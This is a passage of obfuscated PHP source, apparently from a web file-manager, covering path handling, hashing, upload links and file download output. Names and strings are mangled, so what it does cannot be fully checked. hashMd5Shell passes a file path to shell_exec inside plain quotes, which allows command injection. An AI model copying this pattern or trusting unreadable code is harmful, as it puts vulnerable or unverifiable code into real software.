case $É­ıú©Ø[919]: case $É­ıú©Ø[936]: case $É­ıú©Ø[918]: case $É­ıú©Ø[920]: return str_ireplace($É­ıú©Ø[58], $É­ıú©Ø[59], $ßäÖŠ›ï); } } protected function parseValue($Ê»§ã² ) { $óŞ—Ù÷ =& $_SERVER[ßğøİ]; if (is_string($Ê»§ã² )) { $øğ¥ï¦¨ = strpos($Ê»§ã² , $óŞ—Ù÷[4]) === 0 && in_array($Ê»§ã² , array_keys($this->bind)); $Ê»§ã²  = $øğ¥ï¦¨ ? $this->escapeString($Ê»§ã² ) : $óŞ—Ù÷[957] . $this->escapeString($Ê»§ã² ) . $óŞ—Ù÷[957]; } elseif (isset($Ê»§ã² [0]) && is_string($Ê»§ã² [0]) && strtolower($Ê»§ã² [0]) == $óŞ—Ù÷[297]) { $Ê»§ã²  = $this->escapeString($Ê»§ã² [1]); } elseif (is_array($Ê»§ã² )) { $Ê»§ã²  = array_map(array($this, $óŞ—Ù÷[958]), $Ê»§ã² ); } elseif (is_bool($Ê»§ã² )) { $Ê»§ã²  = $Ê»§ã²  ? $óŞ—Ù÷[88] : $óŞ—Ù÷[197]; } elseif (is_null($Ê»§ã² )) { $Ê»§ã²  = $óŞ—Ù÷[103]; } return $Ê»§ã² ; } public function getLastInsertId() { $Ä–ıôíè =& $_SERVER[ßğøİ]; switch ($this->dbType) { case $Ä–ıôíè[944]: case $Ä–ıôíè[936]: case $Ä–ıôíè[917]: case $Ä–ıôíè[935]: case $Ä–ıôíè[919]: case $Ä–ıôíè[947]: return $this->_linkID->lastInsertId(); case $Ä–ıôíè[918]: case $Ä–ıôíè[920]: $÷«Ùéñ = $this->table; $‹‰Ç‚·ë = $this->query("\x53\105\x4c\105\103\x54\40{$÷«Ùéñ}\56\x63\x75\x72\x72\166\x61\154\40\143\165\162\162\x76\141\154\40\x46\122\117\115\x20\x64\x75\141\154"); return $‹‰Ç‚·ë ? $‹‰Ç‚·ë[0][$Ä–ıôíè[959]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¡…¸ä¡¾) { $„¹·–ñ• =& $_SERVER[ßğøİ]; if (!CacheLock::fileLock($„¹·–ñ•[13])) { return !1; } $ÊÔŞçã¯ = parent::query($¡…¸ä¡¾); CacheLock::fileUnLock($„¹·–ñ•[13]); return $ÊÔŞçã¯; } public function execute($”Ş¿ÏÖ¹) { $ãçõ«˜  =& $_SERVER[ßğøİ]; if (!CacheLock::fileLock($ãçõ«˜ [13])) { return !1; } $Ö¥±¡Êë = parent::execute($”Ş¿ÏÖ¹); CacheLock::fileUnLock($ãçõ«˜ [13]); return $Ö¥±¡Êë; } } goto B®­İõˆ¢“; f×­ö°¾¢ª: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $õÎ‡±×ï =& $_SERVER[ßğøİ]; $this->objectDriver = array($õÎ‡±×ï[60], $õÎ‡±×ï[61], $õÎ‡±×ï[62], $õÎ‡±×ï[63], $õÎ‡±×ï[64], $õÎ‡±×ï[65], $õÎ‡±×ï[66], $õÎ‡±×ï[67], $õÎ‡±×ï[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÂúšÓ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÂúšÓ, $_SERVER[ßğøİ][8]); } return $ÂúšÓ; } public function iconvApp($í‹«ü‘Ú) { return $í‹«ü‘Ú; } public function iconvSystem($€åêÓ©) { return $€åêÓ©; } public function iconvTo($…°Ÿ“Æ¨, $¡Ÿş—Š¶, $ƒÒÈßúÃ) { $«ªÚ˜Çç =& $_SERVER[ßğøİ]; if (!$…°Ÿ“Æ¨ || !function_exists($«ªÚ˜Çç[69])) { return $…°Ÿ“Æ¨; } static $© ïØ´ = array(); $†Û¦Â£ = $¡Ÿş—Š¶ . $«ªÚ˜Çç[70] . $ƒÒÈßúÃ . $«ªÚ˜Çç[71] . $…°Ÿ“Æ¨; if (isset($© ïØ´[$†Û¦Â£])) { return $© ïØ´[$†Û¦Â£]; } if (function_exists($«ªÚ˜Çç[72])) { $Ùª¨’¾õ = @mb_convert_encoding($…°Ÿ“Æ¨, $ƒÒÈßúÃ, $¡Ÿş—Š¶); } else { $Ùª¨’¾õ = @iconv($¡Ÿş—Š¶, $ƒÒÈßúÃ, $…°Ÿ“Æ¨); } $Ùª¨’¾õ = $Ùª¨’¾õ ? $Ùª¨’¾õ : $…°Ÿ“Æ¨; if (strstr($Ùª¨’¾õ, $«ªÚ˜Çç[73])) { $Ùª¨’¾õ = str_replace($«ªÚ˜Çç[73], $«ªÚ˜Çç[11], $Ùª¨’¾õ); } $© ïØ´[$¡Ÿş—Š¶ . $«ªÚ˜Çç[70] . $ƒÒÈßúÃ . $«ªÚ˜Çç[71] . $…°Ÿ“Æ¨] = $Ùª¨’¾õ; $© ïØ´[$ƒÒÈßúÃ . $«ªÚ˜Çç[70] . $¡Ÿş—Š¶ . $«ªÚ˜Çç[71] . $…°Ÿ“Æ¨] = $…°Ÿ“Æ¨; $© ïØ´[$ƒÒÈßúÃ . $«ªÚ˜Çç[70] . $¡Ÿş—Š¶ . $«ªÚ˜Çç[71] . $Ùª¨’¾õ] = $…°Ÿ“Æ¨; $© ïØ´[$¡Ÿş—Š¶ . $«ªÚ˜Çç[70] . $ƒÒÈßúÃ . $«ªÚ˜Çç[71] . $Ùª¨’¾õ] = $Ùª¨’¾õ; return $Ùª¨’¾õ; } public function getPathInner($˜Ô–°‘ç) { $¼á·º¸š = IO::init($˜Ô–°‘ç); return $¼á·º¸š->path; } public function getPathOuter($“”Ãşàô) { $¨ÂûşÇ– =& $_SERVER[ßğøİ]; $â›¦›ÁŸ = strlen(trim($this->pathBase, $¨ÂûşÇ–[8])); $“”Ãşàô = substr(trim($“”Ãşàô, $¨ÂûşÇ–[8]), $â›¦›ÁŸ); return $this->pathDriver . $¨ÂûşÇ–[8] . ltrim($“”Ãşàô, $¨ÂûşÇ–[8]); } public function isParentOf($”£åÅ³î, $ì›„È°ã) { $ì·ïÅË¬ =& $_SERVER[ßğøİ]; $”£åÅ³î = rtrim(strtolower($”£åÅ³î), $ì·ïÅË¬[8]) . $ì·ïÅË¬[8]; $ì›„È°ã = rtrim(strtolower($ì›„È°ã), $ì·ïÅË¬[8]) . $ì·ïÅË¬[8]; $Á‡Ì¯§ = strpos($ì›„È°ã, $”£åÅ³î) === 0; return $Á‡Ì¯§; } public function getType() { $Ğ­¸áóà =& $_SERVER[ßğøİ]; $ÅËŸİ»§ = str_replace($Ğ­¸áóà[74], $Ğ­¸áóà[12], get_class($this)); return strtolower($ÅËŸİ»§); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Äµâïã¬, $£±ï’õ”) { $¨ÛĞÀâŠ =& $_SERVER[ßğøİ]; $‡¨¹É‡ó = rtrim($Äµâïã¬, $¨ÛĞÀâŠ[8]) . $¨ÛĞÀâŠ[8] . $£±ï’õ”; $€£µ´Ãö = $this->exist($‡¨¹É‡ó); return $€£µ´Ãö ? $‡¨¹É‡ó : !1; } public function setModifyTime($ÃÙãïóù, $ü¬Æˆí« = '') { } public function renameObject($¦Õ«Ï½, $ç­©®ş½) { $ »ï§¥… = $ç­©®ş½; $¦Õ«Ï½ = $this->getPathOuter($¦Õ«Ï½); $ç­©®ş½ = $this->pathFather($¦Õ«Ï½) . $ç­©®ş½; $ÇáØó› = IO::copy($¦Õ«Ï½, $this->pathFather($¦Õ«Ï½), REPEAT_RENAME_FOLDER, $ »ï§¥…); if ($ÇáØó›) { IO::remove($¦Õ«Ï½); } return $ÇáØó› ? $ç­©®ş½ : !1; } public function tempFile($×„Ôı = '', $¯ëö¹‚€ = '') { if (!$×„Ôı) { $×„Ôı = rand_string(15); } $ìëéıĞÙ = TEMP_FILES . rand_string(15) . $_SERVER[ßğøİ][8]; @mkdir($ìëéıĞÙ, DEFAULT_PERRMISSIONS, !0); $ğÕ–›ê = $ìëéıĞÙ . $×„Ôı; @touch($ğÕ–›ê); if ($¯ëö¹‚€) { file_put_contents($ğÕ–›ê, $¯ëö¹‚€); } return $ğÕ–›ê; } public function tempFileRemve($¦ÔæÌ§) { @unlink($¦ÔæÌ§); @rmdir($this->pathFather($¦ÔæÌ§)); } public function mkfile($ÈÙ¸Ã¶ö, $ŒıÔò÷ = '', $«Ìáé· = REPEAT_RENAME) { } public function mkdir($°àßÛ×, $öˆÕ³Œé = REPEAT_SKIP) { } public function delFile($ÊÛà¤Ğ±) { } public function delFolder($ÚĞ©€ş¨) { } public function copyFile($éõşû‹è, $¸ÏŞÂá·) { } public function moveFile($ò®å©¦, $Çå¢¾ª«) { } public function remove($™ñ¾âµ³) { if ($this->isFile($™ñ¾âµ³)) { return $this->delFile($™ñ¾âµ³); } return $this->delFolder($™ñ¾âµ³); } public function rename($ÖáĞ˜Ãú, $©ÙˆàÑ×) { } public function exist($À†¿›ˆ¾) { } public function findByHash($œã°£™› = '', $ÛçøÛ‚› = '') { return !1; } public function isFile($ò±¿Â½) { } public function isFolder($—“Íú”ú) { } public function size($çáıĞªÙ) { } public function info($„¨âè¦„) { } public function infoSimple($…³ßäŞ) { return $this->info($…³ßäŞ); } public function infoAuth($ƒ•ÊÊ) { return $this->info($ƒ•ÊÊ); } public function infoFull($øì›Åğ˜) { return $this->info($øì›Åğ˜); } public function infoWithChildren($í’Ú…ğÆ) { $¨ ¹…ÛØ =& $_SERVER[ßğøİ]; static $´÷¶ÃÄ¼ = array(); if (isset($´÷¶ÃÄ¼[$í’Ú…ğÆ])) { return $´÷¶ÃÄ¼[$í’Ú…ğÆ]; } $À‹…ˆ¶¤ = $this->info($í’Ú…ğÆ); if ($À‹…ˆ¶¤ && $À‹…ˆ¶¤[$¨ ¹…ÛØ[33]] == $¨ ¹…ÛØ[75]) { $ßäıè…Æ = array($¨ ¹…ÛØ[76] => 0, $¨ ¹…ÛØ[77] => 0, $¨ ¹…ÛØ[78] => 0); $this->infoChildren($í’Ú…ğÆ, $ßäıè…Æ); $À‹…ˆ¶¤[$¨ ¹…ÛØ[76]] = $ßäıè…Æ[$¨ ¹…ÛØ[76]]; $À‹…ˆ¶¤[$¨ ¹…ÛØ[79]] = array($¨ ¹…ÛØ[80] => $ßäıè…Æ[$¨ ¹…ÛØ[77]], $¨ ¹…ÛØ[81] => $ßäıè…Æ[$¨ ¹…ÛØ[78]]); $´÷¶ÃÄ¼[$í’Ú…ğÆ] = $À‹…ˆ¶¤; } return $À‹…ˆ¶¤; } public function listPath($øª¥úş’, $£«åÜÇÃ = false) { } public function has($È¥…Ç¸à, $–°şŞâ = false, $Ì¿š“ø = false) { } public function canRead($§”¬¬™¬) { } public function canWrite($ ”±Œ‡û) { } public function getContent($³È¸Öè) { } public function setContent($º¢’ÕŞ‹, $ò²¾ØÇÇ = '') { } protected function infoChildren($Ñü¢·¼—, &$âõˆåìØ) { $é£òıŞÖ =& $_SERVER[ßğøİ]; check_abort_echo(); $¢—×÷Ïñ = $this->listPath($Ñü¢·¼—, !0); $¢—×÷Ïñ = array_merge($¢—×÷Ïñ[$é£òıŞÖ[82]], $¢—×÷Ïñ[$é£òıŞÖ[83]]); foreach ($¢—×÷Ïñ as $öÄ÷“³) { if ($öÄ÷“³[$é£òıŞÖ[33]] == $é£òıŞÖ[75]) { $âõˆåìØ[$é£òıŞÖ[78]]++; $‚ ÇÂÛä = $this->getPathInner($öÄ÷“³[$é£òıŞÖ[84]]); $this->infoChildren($‚ ÇÂÛä, $âõˆåìØ); } else { $âõˆåìØ[$é£òıŞÖ[77]]++; $âõˆåìØ[$é£òıŞÖ[76]] += $öÄ÷“³[$é£òıŞÖ[76]]; } } } public function fileSubstr($öÛ‰§‘², $ÀÜÌ©³ç, $ãÈÈÅ…ô) { } public function listAll($ğ²Œ¥¡) { } public function listAllMake($½İ‰Óƒ‚, &$·ø­ö“) { $É˜ÂÓ× =& $_SERVER[ßğøİ]; check_abort_echo(); $“ÃÎ–Û = $this->listPath($½İ‰Óƒ‚, !0); if (!$“ÃÎ–Û) { return; } $ÊŞ×Äá = array_merge($“ÃÎ–Û[$É˜ÂÓ×[82]], $“ÃÎ–Û[$É˜ÂÓ×[83]]); foreach ($ÊŞ×Äá as $Û£±­) { $óø€Ú÷Œ = $Û£±­[$É˜ÂÓ×[33]] == $É˜ÂÓ×[75]; $èˆ…ãº = array($É˜ÂÓ×[84] => $Û£±­[$É˜ÂÓ×[84]], $É˜ÂÓ×[75] => $óø€Ú÷Œ); if (isset($Û£±­[$É˜ÂÓ×[76]])) { $èˆ…ãº[$É˜ÂÓ×[76]] = $Û£±­[$É˜ÂÓ×[76]]; } if (isset($Û£±­[$É˜ÂÓ×[85]])) { $èˆ…ãº[$É˜ÂÓ×[85]] = $Û£±­[$É˜ÂÓ×[85]]; } if (!$óø€Ú÷Œ) { $·ø­ö“[] = $èˆ…ãº; continue; } $·ø­ö“[] = $èˆ…ãº; $š¶­Ù®Ş = $Û£±­[$É˜ÂÓ×[84]]; $®å–™ÉÒ = $this->pathDriver; if (substr($Û£±­[$É˜ÂÓ×[84]], 0, strlen($®å–™ÉÒ)) == $®å–™ÉÒ) { $š¶­Ù®Ş = substr($š¶­Ù®Ş, strlen($®å–™ÉÒ)); } $this->listAllMake($š¶­Ù®Ş, $·ø­ö“); } } public function listAllSimple($¡œ•‰–ì) { $×Îí ğÓ =& $_SERVER[ßğøİ]; $Æšåˆğ÷ = array(); $€ã•°Æà = $this->listAll($¡œ•‰–ì); $¤î¸£„« = $this->getPathOuter($¡œ•‰–ì); foreach ($€ã•°Æà as $“ıŞüÉç) { $Î¼Úù¬½ = $“ıŞüÉç[$×Îí ğÓ[84]]; $ÅÆ€ÛŸí = $“ıŞüÉç[$×Îí ğÓ[84]]; if (isset($“ıŞüÉç[$×Îí ğÓ[86]])) { $Î¼Úù¬½ = $“ıŞüÉç[$×Îí ğÓ[86]][$×Îí ğÓ[84]]; $“ıŞüÉç[$×Îí ğÓ[76]] = $“ıŞüÉç[$×Îí ğÓ[86]][$×Îí ğÓ[76]]; $“ıŞüÉç[$×Îí ğÓ[85]] = $“ıŞüÉç[$×Îí ğÓ[86]][$×Îí ğÓ[85]]; } else { $ÅÆ€ÛŸí = substr($“ıŞüÉç[$×Îí ğÓ[84]], strlen(get_path_father($¤î¸£„«))); $ÅÆ€ÛŸí = $×Îí ğÓ[8] . ltrim($ÅÆ€ÛŸí, $×Îí ğÓ[8]); } $ÕñÊ°ãØ = array($×Îí ğÓ[84] => $ÅÆ€ÛŸí, $×Îí ğÓ[75] => $“ıŞüÉç[$×Îí ğÓ[75]]); if (isset($“ıŞüÉç[$×Îí ğÓ[76]]) && !$“ıŞüÉç[$×Îí ğÓ[75]]) { $ÕñÊ°ãØ[$×Îí ğÓ[76]] = $“ıŞüÉç[$×Îí ğÓ[76]]; } if (isset($“ıŞüÉç[$×Îí ğÓ[85]])) { $ÕñÊ°ãØ[$×Îí ğÓ[85]] = $“ıŞüÉç[$×Îí ğÓ[85]]; } if (!$“ıŞüÉç[$×Îí ğÓ[75]]) { $ÕñÊ°ãØ[$×Îí ğÓ[87]] = $Î¼Úù¬½; } $Æšåˆğ÷[] = $ÕñÊ°ãØ; } return $Æšåˆğ÷; } public function upload($Á÷ú˜Ñ‡, $¤Š×œÖ¸, $Óè˜É‡Î = false, $ø¶Ñ°”œ = REPEAT_REPLACE) { } public function uploadFileByID($¸Å‘¾â¨, $üäæŞ”, $õÒ’Ô³ï) { } public function uploadFileByPath($¬å®²Éƒ, $ş³²ĞÑì, $À©šÔÃ¤ = array()) { } public function isUploadServer() { $ü€˜‡Ê˜ =& $_SERVER[ßğøİ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ü€˜‡Ê˜[88]) { return !0; } return $GLOBALS[$ü€˜‡Ê˜[6]][$ü€˜‡Ê˜[89]][$ü€˜‡Ê˜[90]]; } public function isFileOutServer() { $ç•¢‹¤ƒ =& $_SERVER[ßğøİ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ç•¢‹¤ƒ[88]) { return !0; } return $GLOBALS[$ç•¢‹¤ƒ[6]][$ç•¢‹¤ƒ[89]][$ç•¢‹¤ƒ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($«ŸœÇê«) { $Š‰¶¢ø¤ =& $_SERVER[ßğøİ]; if (!$this->isCdnHost()) { return $«ŸœÇê«; } return str_replace(trim(get_url_root($«ŸœÇê«), $Š‰¶¢ø¤[8]), trim($this->cdnHost, $Š‰¶¢ø¤[8]), $«ŸœÇê«); } public function uploadLink($ãœ¯Ë»—, $ø¹ş„¹ = 0) { $ÁÜõìûç =& $_SERVER[ßğøİ]; if ($this->isUploadServer()) { return; } $‘íïÖÊ… = $this->getType(); if (!in_array($‘íïÖÊ…, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ñòüŞåÜ = 1024 * 1024 * 10; $ÙØˆéâ€ = $ø¹ş„¹ <= $ñòüŞåÜ ? $ÁÜõìûç[92] : $ÁÜõìûç[93]; $ÄŸ“ûûó = (!$ø¹ş„¹ ? 1 : ceil($ø¹ş„¹ / pow(1024, 3))) * 3600 * 4; $ã‹Ãç‘¤ = $this->{$ÙØˆéâ€}($ãœ¯Ë»—, $ÄŸ“ûûó); if ($ã‹Ãç‘¤) { $ã‹Ãç‘¤[$ÁÜõìûç[94]] = $ãœ¯Ë»—; $ã‹Ãç‘¤[$ÁÜõìûç[95]] = $‘íïÖÊ…; } return $ã‹Ãç‘¤; } public function uploadFormData($¶½ÆâİÒ, $•ƒ©¸À = 3600) { } public function multiUploadFormData($éñàµ÷ˆ, $”øêæ‰— = 3600) { } public function download($Ìş’ä, $ĞÏ“‰¡°) { } public function ext($‡óÄêıÖ) { $Åç¶®•­ =& $_SERVER[ßğøİ]; if (strpos($‡óÄêıÖ, $Åç¶®•­[8]) === -1) { $·‹¼¡‰É = $‡óÄêıÖ; } else { $·‹¼¡‰É = $this->pathThis($‡óÄêıÖ); } $ä°ä Şæ = $Åç¶®•­[12]; if (strstr($·‹¼¡‰É, $Åç¶®•­[10])) { $ä°ä Şæ = substr($·‹¼¡‰É, strrpos($·‹¼¡‰É, $Åç¶®•­[10]) + 1); $ä°ä Şæ = strtolower($ä°ä Şæ); } if (strlen($ä°ä Şæ) > 3 && preg_match($Åç¶®•­[96], $ä°ä Şæ, $˜öÕÕú)) { $ä°ä Şæ = $Åç¶®•­[12]; } return $ä°ä Şæ; } public function pathThis($£î·®º›) { $ÚŠ÷Äƒ =& $_SERVER[ßğøİ]; $£î·®º› = str_replace($ÚŠ÷Äƒ[97], $ÚŠ÷Äƒ[8], rtrim($£î·®º›, $ÚŠ÷Äƒ[8])); $ŞíÌÅ±É = strrpos($£î·®º›, $ÚŠ÷Äƒ[8]); if ($ŞíÌÅ±É === !1) { return $£î·®º›; } return substr($£î·®º›, $ŞíÌÅ±É + 1); } public function pathFather($Ú³ášäµ) { $ë…Òğï— =& $_SERVER[ßğøİ]; $Ú³ášäµ = str_replace($ë…Òğï—[97], $ë…Òğï—[8], rtrim($Ú³ášäµ, $ë…Òğï—[8])); $‡öÖÁğ = strrpos($Ú³ášäµ, $ë…Òğï—[8]); if ($‡öÖÁğ === !1) { return $ë…Òğï—[12]; } return substr($Ú³ášäµ, 0, $‡öÖÁğ + 1); } public function hashSimple($íåöÅæ) { $Ôåœìü— =& $_SERVER[ßğøİ]; if (!$íåöÅæ) { return md5($Ôåœìü—[12]); } $¯ÉŒÜñ = $this->size($íåöÅæ); $ëíÎåò‹ = 200; $¢İş­ñò = 50; if ($¯ÉŒÜñ <= $ëíÎåò‹ * $¢İş­ñò) { return $this->hashMd5($íåöÅæ) . $¯ÉŒÜñ; } $ÑëŞ—‡ƒ = intval($¯ÉŒÜñ / $¢İş­ñò); $ÂôäÚÛ™ = $Ôåœìü—[12]; for ($ğ³Ë¼–È = 0; $ğ³Ë¼–È < $¢İş­ñò; $ğ³Ë¼–È++) { $ÂôäÚÛ™ .= $this->fileSubstr($íåöÅæ, $ÑëŞ—‡ƒ * $ğ³Ë¼–È, $ëíÎåò‹); } $ÂôäÚÛ™ .= $this->fileSubstr($íåöÅæ, $¯ÉŒÜñ - $ëíÎåò‹, $ëíÎåò‹); return md5($ÂôäÚÛ™) . $¯ÉŒÜñ; } public static $md5Cache = array(); public function hashMd5($Í°”ù¸ë) { if (!$Í°”ù¸ë) { return md5($_SERVER[ßğøİ][12]); } $Í°”ù¸ë = $this->iconvSystem($Í°”ù¸ë); if (isset(self::$md5Cache[$Í°”ù¸ë])) { return self::$md5Cache[$Í°”ù¸ë]; } self::$md5Cache[$Í°”ù¸ë] = $this->hashMd5Shell($Í°”ù¸ë); if (!self::$md5Cache[$Í°”ù¸ë]) { self::$md5Cache[$Í°”ù¸ë] = @md5_file($Í°”ù¸ë); } return self::$md5Cache[$Í°”ù¸ë]; } private function hashMd5Shell($ºìè”´½) { $—°®˜İ =& $_SERVER[ßğøİ]; if (!$ºìè”´½) { return md5($—°®˜İ[12]); } if (!function_exists($—°®˜İ[98])) { return !1; } $âÖĞ™» = array($—°®˜İ[99], $—°®˜İ[100]); $  ¡¨¶£ = Cache::get($—°®˜İ[101]); if (!$  ¡¨¶£) { $¼ğ›· = BASIC_PATH . $—°®˜İ[102]; $‹â§ƒÎ¾ = md5_file($¼ğ›·); $  ¡¨¶£ = $—°®˜İ[103]; foreach ($âÖĞ™» as $–ëƒ¸Š) { $™§Ò·¨¯ = shell_exec($–ëƒ¸Š . "\40\42{$¼ğ›·}\x22"); if ($™§Ò·¨¯ && substr(trim($™§Ò·¨¯), 0, 32) == $‹â§ƒÎ¾) { $  ¡¨¶£ = $–ëƒ¸Š; break; } } Cache::set($—°®˜İ[101], $  ¡¨¶£, 3600); } if ($  ¡¨¶£ == $—°®˜İ[103]) { return !1; } $™§Ò·¨¯ = shell_exec($  ¡¨¶£ . "\x20\x22{$ºìè”´½}\x22"); $™§Ò·¨¯ = str_replace($—°®˜İ[104], $—°®˜İ[12], $™§Ò·¨¯); return substr($™§Ò·¨¯, 0, 32); } public function link($ğå®™­¢) { return $ğå®™­¢; } public function fileOut($€¦¤ÈÕÂ, $õˆËãñ = false, $Öí¥·±³ = false, $™ñ’”§¯ = '') { $—ª¡¶®Æ =& $_SERVER[ßğøİ]; $this->cacheMethod(null, null); if (!$€¦¤ÈÕÂ || !$this->exist($€¦¤ÈÕÂ)) { show_json(LNG($—ª¡¶®Æ[105]), !1, $Öí¥·±³); } $Öº’ì‡ = $this->getType() == $—ª¡¶®Æ[106]; $³Ä«•õõ = $GLOBALS[$—ª¡¶®Æ[6]][$—ª¡¶®Æ[89]][$—ª¡¶®Æ[107]][$—ª¡¶®Æ[108]]; $Ôº©À±á = (double) $GLOBALS[$—ª¡¶®Æ[6]][$—ª¡¶®Æ[89]][$—ª¡¶®Æ[107]][$—ª¡¶®Æ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÓÌˆ¿Ï = $this->infoFull($€¦¤ÈÕÂ); $­›ç¯¬· = $ÓÌˆ¿Ï[$—ª¡¶®Æ[76]]; $üŞ¨é—× = gmdate($—ª¡¶®Æ[110], $ÓÌˆ¿Ï[$—ª¡¶®Æ[85]]); $¬òÚ“ï = $Öí¥·±³ ? $Öí¥·±³ : $this->iconvApp($ÓÌˆ¿Ï[$—ª¡¶®Æ[32]]); $›áÌšåÃ = 0; $‘®Şá‡ = $­›ç¯¬· - 1; $€©ıµê = $this->ext($¬òÚ“ï); if (in_array($€©ıµê, array($—ª¡¶®Æ[111], $—ª¡¶®Æ[112], $—ª¡¶®Æ[113], $—ª¡¶®Æ[114]))) { $€©ıµê = $—ª¡¶®Æ[115]; } if (in_array($€©ıµê, array($—ª¡¶®Æ[116]))) { $€©ıµê = $—ª¡¶®Æ[117]; } if (!$™ñ’”§¯) { $™ñ’”§¯ = md5($üŞ¨é—× . $this->hashSimple($€¦¤ÈÕÂ)); } $™ñ’”§¯ = $—ª¡¶®Æ[118] . $™ñ’”§¯ . $—ª¡¶®Æ[118]; $Á–°Œ«ä = get_file_mime($€©ıµê); $ËÖŠ€Ã = !0; $ËÖŠ€Ã = isset($_GET[$—ª¡¶®Æ[119]]) ? !1 : !0; if ($õˆËãñ === !1 && !mime_support($Á–°Œ«ä)) { $Á–°Œ«ä = $—ª¡¶®Æ[120]; } header($—ª¡¶®Æ[121]); header($—ª¡¶®Æ[122] . $Á–°Œ«ä); $¥ÏÉ˜¬õ = rawurlencode($¬òÚ“ï); $¥ÏÉ˜¬õ = $—ª¡¶®Æ[118] . $¥ÏÉ˜¬õ . $—ª¡¶®Æ[123] . $¥ÏÉ˜¬õ; if ($õˆËãñ) { header($—ª¡¶®Æ[124]); header($—ª¡¶®Æ[125] . $¥ÏÉ˜¬õ); } else { if ($ËÖŠ€Ã) { header($—ª¡¶®Æ[126] . $¥ÏÉ˜¬õ); } } header($—ª¡¶®Æ[127] . gmdate($—ª¡¶®Æ[110], time() + 3600 * 24 * 30) . $—ª¡¶®Æ[128]); header($—ª¡¶®Æ[129]); header($—ª¡¶®Æ[130]); header($—ª¡¶®Æ[131]); if (isset($_SERVER[$—ª¡¶®Æ[132]]) && strtotime($_SERVER[$—ª¡¶®Æ[132]]) == $ÓÌˆ¿Ï[$—ª¡¶®Æ[85]]) { header($—ª¡¶®Æ[133], !0, 304); die; } if (isset($_SERVER[$—ª¡¶®Æ[134]]) && $_SERVER[$—ª¡¶®Æ[134]] == $™ñ’”§¯) { header($—ª¡¶®Æ[135] . $™ñ’”§¯, !0, 304); die; } header($—ª¡¶®Æ[135] . $™ñ’”§¯); header($—ª¡¶®Æ[136] . $üŞ¨é—× . $—ª¡¶®Æ[128]); header($—ª¡¶®Æ[137] . $¬òÚ“ï); header($—ª¡¶®Æ[138]); header($—ª¡¶®Æ[139] . $­›ç¯¬·); header($—ª¡¶®Æ[140]); if (!$õˆËãñ && $€©ıµê == $—ª¡¶®Æ[141]) { if ($­›ç¯¬· > 1024 * 1024 * 5) { die; } $Áª’ûÍ = $this->getContent($€¦¤ÈÕÂ); $Áª’ûÍ = Html::clearSVG($Áª’ûÍ); header($—ª¡¶®Æ[142] . strlen($Áª’ûÍ)); echo $Áª’ûÍ; die; } $ë¢ƒ¸×á = strtolower($_SERVER[$—ª¡¶®Æ[143]]); if ($Öº’ì‡ && $ë¢ƒ¸×á && $³Ä«•õõ) { if (strstr($ë¢ƒ¸×á, $—ª¡¶®Æ[144])) { header($—ª¡¶®Æ[145] . $€¦¤ÈÕÂ); } else { if (strstr($ë¢ƒ¸×á, $—ª¡¶®Æ[146])) { header($—ª¡¶®Æ[147] . $€¦¤ÈÕÂ); } else { if (strstr($ë¢ƒ¸×á, $—ª¡¶®Æ[148])) { header($—ª¡¶®Æ[149] . $€¦¤ÈÕÂ); } } } if ($Ôº©À±á) { header($—ª¡¶®Æ[150] . $Ôº©À±á); } return; } if (isset($_SERVER[$—ª¡¶®Æ[151]])) { if (preg_match($—ª¡¶®Æ[152], $_SERVER[$—ª¡¶®Æ[151]], $œÍª˜ÙŠ)) { $›áÌšåÃ = intval($œÍª˜ÙŠ[1]); if (!empty($œÍª˜ÙŠ[2])) { $‘®Şá‡ = intval($œÍª˜ÙŠ[2]); } } header($—ª¡¶®Æ[153]); header("\103\157\156\164\145\156\x74\x2d\x52\x61\156\x67\145\72\x20\142\x79\x74\145\x73\40{$›áÌšåÃ}\55{$‘®Şá‡}\57" . $­›ç¯¬·); } else { header($—ª¡¶®Æ[154]); } header($—ª¡¶®Æ[155]); $¬ğæ”Ğ˜ = !0; if ($_SERVER[$—ª¡¶®Æ[156]] == $—ª¡¶®Æ[157] && $­›ç¯¬· > 1204 * 1024 * 1024 * 2) { $¬ğæ”Ğ˜ = !1; } if ($¬ğæ”Ğ˜) { header($—ª¡¶®Æ[158] . ($‘®Şá‡ - $›áÌšåÃ + 1)); } if ($_SERVER[$—ª¡¶®Æ[159]] == $—ª¡¶®Æ[160]) { return; } $ñƒç½Ä¢ = 1024 * 100; $¨÷ìÛ = 0; if ($Ôº©À±á) { $¨÷ìÛ = intval(1000 * 1000 * ($ñƒç½Ä¢ / $Ôº©À±á)); } while ($›áÌšåÃ <= $‘®Şá‡) { $“¡³»÷ = timeFloat(); check_abort(); $¢Î«Í³ = $‘®Şá‡ - $›áÌšåÃ + 1; if ($¢Î«Í³ <= $ñƒç½Ä¢) { $ñƒç½Ä¢ = $¢Î«Í³; } echo $this->fileSubstr($€¦¤ÈÕÂ, $›áÌšåÃ, $ñƒç½Ä¢); $›áÌšåÃ += $ñƒç½Ä¢; if ($ñƒç½Ä¢ == $¢Î«Í³) { $›áÌšåÃ = $‘®Şá‡ + 1; } if ($¨÷ìÛ) { $îÏ´—¯— = intval(1000 * 1000 * (timeFloat() - $“¡³»÷)); $ÊğôŒÄ© = $¨÷ìÛ - $îÏ´—¯—; if ($ÊğôŒÄ© > 5) { usleep($ÊğôŒÄ©); } } } } public function fileOutServer($ÃÑê‚ß…, $ã€é¡“  = false, $ØÍËÊÄ = false, $÷åÆ ®Ö = '') { $this->fileOut($ÃÑê‚ß…, $ã€é¡“ , $ØÍËÊÄ, $÷åÆ ®Ö); } public function fileOutLink($ë ã‡Á) { header($_SERVER[ßğøİ][161] . $ë ã‡Á); die; } public function cacheMethod($ËÔÆ˜¨¼, $ÌÖ˜ÇŸã, $ —§€ = null) { $Ë£Ğó²¸ =& $_SERVER[ßğøİ]; static $Â‹ÇÛ«£ = array(); $ñù›¦Èç = $ÌÖ˜ÇŸã ? ltrim($this->getPathOuter($ÌÖ˜ÇŸã), 